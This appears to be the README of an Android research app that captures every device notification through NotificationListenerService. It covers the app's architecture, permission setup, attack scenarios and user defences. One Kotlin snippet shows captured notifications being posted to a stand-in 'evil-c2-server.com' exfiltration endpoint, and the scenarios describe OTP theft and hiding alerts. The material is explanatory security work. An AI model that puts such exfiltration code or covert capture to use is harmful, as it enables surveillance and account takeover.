# Notification Capture — Android Security Research Tool

> **DISCLAIMER:** This application is built strictly for cybersecurity research and educational purposes. It demonstrates how a malicious application could exploit Android's `NotificationListenerService` API to spy on user notifications. Use responsibly and only on devices you own.

---

## Table of Contents

1. [Project Overview](#project-overview)
2. [Architecture](#architecture)
3. [Project Structure](#project-structure)
4. [How to Build & Run](#how-to-build--run)
5. [Enabling Notification Access (Step-by-Step)](#enabling-notification-access-step-by-step)
6. [How NotificationListenerService Works Internally](#how-notificationlistenerservice-works-internally)
7. [Why Android Requires Explicit Permission](#why-android-requires-explicit-permission)
8. [Security Implications & Attack Scenarios](#security-implications--attack-scenarios)
9. [How Users Can Protect Themselves](#how-users-can-protect-themselves)
10. [Technical Details](#technical-details)

---

## Project Overview

This Android application demonstrates the power (and danger) of the `NotificationListenerService` API by:

- **Intercepting** every notification posted by any installed app on the device
- **Extracting** the title, content, source app name, package name, and timestamp
- **Persisting** captured data in a local Room (SQLite) database
- **Displaying** captured notifications in a real-time Compose UI
- **Logging** structured data to Logcat for debugging/analysis

---

## Architecture

The app follows **MVVM (Model-View-ViewModel)** architecture with clean separation of concerns:

```
┌─────────────────────────────────────────────────────────────────┐
│                        PRESENTATION LAYER                       │
│  ┌─────────────┐    ┌──────────────────┐                        │
│  │ MainActivity │ →  │ NotificationList │  (Jetpack Compose)     │
│  │              │    │ Screen           │                        │
│  └─────────────┘    └────────┬─────────┘                        │
│                              │ collectAsStateWithLifecycle       │
│                     ┌────────▼─────────┐                        │
│                     │ NotificationView │  (AndroidViewModel)     │
│                     │ Model            │                        │
│                     └────────┬─────────┘                        │
├──────────────────────────────┼──────────────────────────────────┤
│                        DATA LAYER                               │
│                     ┌────────▼─────────┐                        │
│                     │ Notification     │  (Repository Pattern)   │
│                     │ Repository       │                        │
│                     └────────┬─────────┘                        │
│                              │                                  │
│                     ┌────────▼─────────┐                        │
│                     │ NotificationDao  │  (Room DAO)             │
│                     └────────┬─────────┘                        │
│                              │                                  │
│                     ┌────────▼─────────┐                        │
│                     │ AppDatabase      │  (Room / SQLite)        │
│                     └──────────────────┘                        │
├─────────────────────────────────────────────────────────────────┤
│                       SERVICE LAYER                             │
│  ┌──────────────────────────┐                                   │
│  │ NotificationCapture      │  (NotificationListenerService)    │
│  │ Service                  │ ──writes──→ Room DB               │
│  └──────────────────────────┘                                   │
└─────────────────────────────────────────────────────────────────┘
```

**Data flow:**
1. Android system calls `NotificationCaptureService.onNotificationPosted()`
2. Service extracts notification fields and writes to Room DB
3. Room emits new data via Kotlin `Flow`
4. ViewModel converts Flow to `StateFlow` for lifecycle-aware collection
5. Compose UI automatically recomposes with the new notification list

---

## Project Structure

```
app/src/main/
├── AndroidManifest.xml                          # Service & permission declarations
├── java/com/putra/notificationlisteners/
│   ├── MainActivity.kt                          # Entry point, hosts Compose UI
│   ├── NotificationApp.kt                       # Custom Application class
│   ├── data/
│   │   ├── db/
│   │   │   ├── NotificationEntity.kt            # Room @Entity (data model)
│   │   │   ├── NotificationDao.kt               # Room @Dao (data access)
│   │   │   └── AppDatabase.kt                   # Room @Database (singleton)
│   │   └── repository/
│   │       └── NotificationRepository.kt        # Repository pattern
│   ├── service/
│   │   └── NotificationCaptureService.kt        # Core listener service
│   ├── viewmodel/
│   │   └── NotificationViewModel.kt             # MVVM ViewModel
│   └── ui/
│       ├── components/
│       │   └── NotificationCard.kt              # Single notification card
│       ├── screens/
│       │   └── NotificationListScreen.kt        # Main screen composable
│       └── theme/
│           ├── Color.kt
│           ├── Theme.kt
│           └── Type.kt
└── res/
    ├── values/
    │   ├── strings.xml
    │   ├── colors.xml
    │   └── themes.xml
    └── xml/
        ├── backup_rules.xml
        └── data_extraction_rules.xml
```

---

## How to Build & Run

### Prerequisites
- Android Studio Ladybug (2024.2+) or newer
- Android SDK 36 (API level 36)
- Minimum device/emulator: Android 10 (API 29)
- Kotlin 2.0.21+

### Build Steps

1. **Clone/open the project** in Android Studio

2. **Sync Gradle** — Android Studio should auto-sync. If not:
   ```
   File → Sync Project with Gradle Files
   ```

3. **Build the APK**:
   ```bash
   ./gradlew assembleDebug
   ```
   The APK will be at: `app/build/outputs/apk/debug/app-debug.apk`

4. **Install on device**:
   ```bash
   adb install app/build/outputs/apk/debug/app-debug.apk
   ```

5. **Launch the app** and follow the permission setup below.

---

## Enabling Notification Access (Step-by-Step)

The app **CANNOT** request this permission programmatically. The user must manually enable it:

### Method 1: Via the App UI
1. Open the **Notification Capture** app
2. You'll see a red banner saying **"Notification Access Required"**
3. Tap **"Open Settings"** — this takes you directly to the Notification Access settings
4. Find **"NotificationListeners"** in the list
5. Toggle it **ON**
6. Confirm the security warning dialog ("Allow NotificationListeners to access notifications?")
7. Return to the app — tap **"Refresh"** to update the status
8. The green "Listener Active" banner should now appear

### Method 2: Manual Navigation
1. Open **Settings** on your Android device
2. Go to **Apps & notifications** (or **Notifications**)
3. Tap **Special app access** (or **Advanced**)
4. Tap **Notification access**
5. Find **"NotificationListeners"** and toggle it ON
6. Confirm the security dialog

### Method 3: Via ADB (for testing)
```bash
adb shell cmd notification allow_listener com.putra.notificationlisteners/com.putra.notificationlisteners.service.NotificationCaptureService
```

### Verification
Once enabled, any notification from any app will immediately appear in the capture list. Test by:
- Sending yourself a message on WhatsApp/Telegram
- Setting a timer/alarm
- Receiving an email

---

## How NotificationListenerService Works Internally

### System Architecture

```
┌──────────────────────────────────────────────────────────┐
│                    ANDROID SYSTEM                         │
│                                                          │
│  App A calls                                             │
│  NotificationManager.notify() ──→ ┌────────────────────┐ │
│                                   │ NotificationManager │ │
│  App B calls                      │ Service (system)    │ │
│  NotificationManager.notify() ──→ │                    │ │
│                                   │ Maintains list of   │ │
│  App C calls                      │ active listeners    │ │
│  NotificationManager.notify() ──→ │                    │ │
│                                   └────────┬───────────┘ │
│                                            │ IPC (Binder) │
│                              ┌─────────────┼─────────────┐│
│                              ▼             ▼             ▼│
│                         Listener 1   Listener 2   Listener 3
│                         (System UI)  (Our app)   (Wear OS) │
└──────────────────────────────────────────────────────────┘
```

### Step-by-Step Internal Flow

1. **Registration Phase:**
   - When the user enables notification access in Settings, the system records our `ComponentName` in `Settings.Secure["enabled_notification_listeners"]`
   - `NotificationManagerService` (a system service running in `system_server`) reads this list and binds to each listed service using `bindService()`

2. **Binding Phase:**
   - The system calls our service's `onBind()` (inherited from `NotificationListenerService`)
   - This returns an `INotificationListener.Stub` Binder object
   - The system holds this Binder reference for IPC communication
   - `onListenerConnected()` is called on our service

3. **Notification Delivery:**
   - When ANY app calls `NotificationManager.notify()`, the `NotificationManagerService` iterates through all bound listeners
   - For each listener, it calls `onNotificationPosted(StatusBarNotification)` via the Binder IPC
   - The `StatusBarNotification` contains:
     - `notification`: The full `Notification` object with extras Bundle
     - `packageName`: Source app's package name
     - `postTime`: When the notification was posted (epoch ms)
     - `key`: Unique identifier for the notification
     - `id` / `tag`: The app's own notification ID and tag

4. **Extras Bundle Contents:**
   - `Notification.EXTRA_TITLE` → Notification title
   - `Notification.EXTRA_TEXT` → Short body text
   - `Notification.EXTRA_BIG_TEXT` → Expanded body (if available)
   - `Notification.EXTRA_SUB_TEXT` → Subtitle
   - `Notification.EXTRA_INFO_TEXT` → Info text
   - `Notification.EXTRA_SUMMARY_TEXT` → Summary
   - `Notification.EXTRA_MESSAGES` → Message-style notification history
   - `Notification.EXTRA_PICTURE` → Attached image bitmap
   - And many more...

5. **Capabilities:**
   - `cancelNotification(key)` → Dismiss a notification
   - `snoozeNotification(key, duration)` → Snooze a notification
   - `getActiveNotifications()` → Get all currently visible notifications
   - `requestListenerHints()` → Request DND-like behavior
   - `requestInterruptionFilter()` → Control interruption level

---

## Why Android Requires Explicit Permission

Android's security model enforces the **Principle of Least Privilege**. Notification access is treated as a **Special App Access** permission (not a standard runtime permission) for these reasons:

### 1. Cannot Be Granted Programmatically
Unlike camera or location permissions, notification access can ONLY be granted through Settings. There is no `ActivityResultContract` or runtime dialog. This adds deliberate friction.

### 2. No Runtime Permission Dialog
The standard `requestPermissions()` API does not support `BIND_NOTIFICATION_LISTENER_SERVICE`. This prevents apps from showing misleading "Allow" prompts that users might blindly approve.

### 3. Explicit User Action Required
The user must:
- Navigate to Settings
- Find the specific Notification Access page
- Read the warning about what the permission allows
- Manually toggle the switch
- Confirm a security warning dialog

### 4. System-Level Warning
Android shows a WARNING dialog stating:
> "**[App Name]** will be able to read all notifications, including personal information such as contact names and the text of messages you receive."

This ensures informed consent.

### 5. Revocable at Any Time
Users can disable notification access at any time from Settings, immediately disconnecting the listener service.

---

## Security Implications & Attack Scenarios

### What an Attacker Could Capture

| Data Type | Source Apps | Risk Level |
|-----------|------------|------------|
| **2FA/OTP codes** | SMS, Google Auth, banking apps | 🔴 Critical |
| **Chat messages** | WhatsApp, Telegram, Signal, SMS | 🔴 Critical |
| **Email previews** | Gmail, Outlook | 🔴 Critical |
| **Financial alerts** | Banking apps, payment apps | 🔴 Critical |
| **Password resets** | Any service sending reset emails | 🔴 Critical |
| **Calendar events** | Google Calendar, Outlook | 🟡 High |
| **Social media** | Instagram, Twitter, Facebook | 🟡 High |
| **Delivery tracking** | Amazon, FedEx, UPS | 🟢 Medium |

### Attack Scenarios

#### 1. Silent OTP Theft
A malicious app captures SMS verification codes in real-time, forwarding them to an attacker who has already obtained the victim's password through phishing.

#### 2. Real-Time Message Surveillance
An attacker monitors all messaging app notifications, building a complete log of the victim's conversations without compromising any individual chat app.

#### 3. Financial Fraud
By capturing banking notifications (transaction alerts, balance updates, OTPs), an attacker can time unauthorized transactions when funds are available.

#### 4. Social Engineering
Captured notification data (contacts, habits, communication patterns) enables highly targeted spear-phishing attacks.

#### 5. Data Exfiltration
Instead of local storage as in our demo, a malicious app would:
```kotlin
// WHAT AN ATTACKER WOULD DO (NOT implemented in this demo):
serviceScope.launch {
    val json = gson.toJson(capturedNotification)
    httpClient.post("https://evil-c2-server.com/exfil") {
        body = json
    }
}
```

#### 6. Notification Manipulation
A listener can also DISMISS notifications, allowing an attacker to:
- Capture an OTP notification and immediately dismiss it → victim never sees it
- Hide security alerts ("New sign-in from unknown device")

---

## How Users Can Protect Themselves

### For End Users

1. **Audit Notification Access Regularly**
   - Go to `Settings → Apps → Special App Access → Notification access`
   - Review which apps have this permission
   - Disable any app you don't explicitly trust

2. **Be Suspicious of Permission Requests**
   - If an app asks you to enable notification access and it doesn't obviously need it (e.g., a flashlight app), it's likely malicious

3. **Disable Notification Previews**
   - `Settings → Notifications → Lock screen → Hide sensitive content`
   - This reduces the data visible in notification payloads

4. **Use App-Level Settings**
   - Many messaging apps (Signal, Telegram) allow disabling message previews in notifications
   - Enable this for sensitive conversations

5. **Install Apps from Trusted Sources Only**
   - Google Play Protect scans for notification listener abuse
   - Sideloaded APKs bypass this protection

6. **Use a Security Scanner**
   - Apps like Malwarebytes or Lookout can flag apps with suspicious permissions

### For Developers / Security Engineers

1. **Don't Send Sensitive Data in Notifications**
   - Mask OTP codes: "Your code is ●●●●" with in-app reveal
   - Use `setVisibility(VISIBILITY_SECRET)` for sensitive notifications

2. **Implement Certificate Pinning**
   - If your app communicates with a backend, pin certificates to prevent MITM attacks that could combine with notification capture

3. **Use Notification Channels Wisely**
   - Android's notification channels let users control which categories of notifications are shown
   - High-security notifications should be in a dedicated channel

4. **Consider In-App Messaging**
   - For critical security messages (OTPs, transaction confirmations), use in-app UI instead of system notifications

---

## Technical Details

### Dependencies

| Dependency | Version | Purpose |
|-----------|---------|---------|
| Kotlin | 2.0.21 | Language |
| Compose BOM | 2024.09.00 | UI framework |
| Material 3 | (from BOM) | Design system |
| Room | 2.6.1 | Local database |
| KSP | 2.0.21-1.0.28 | Annotation processing |
| Lifecycle ViewModel | 2.6.1 | MVVM ViewModel |
| Lifecycle Runtime Compose | 2.6.1 | collectAsStateWithLifecycle |

### Key APIs Used

- `NotificationListenerService` — Core API for notification interception
- `StatusBarNotification` — Container for notification data
- `Notification.extras` — Bundle containing title, text, and other fields
- `Settings.Secure["enabled_notification_listeners"]` — Permission check
- `Room @Database/@Dao/@Entity` — Local persistence
- `Kotlin Flow / StateFlow` — Reactive data streams
- `Jetpack Compose` — Declarative UI

### Minimum SDK: Android 10 (API 29)
### Target SDK: Android 16 (API 36)

---

## License

This project is provided for **educational and security research purposes only**. The author assumes no responsibility for misuse. Always obtain proper authorization before testing on any device.
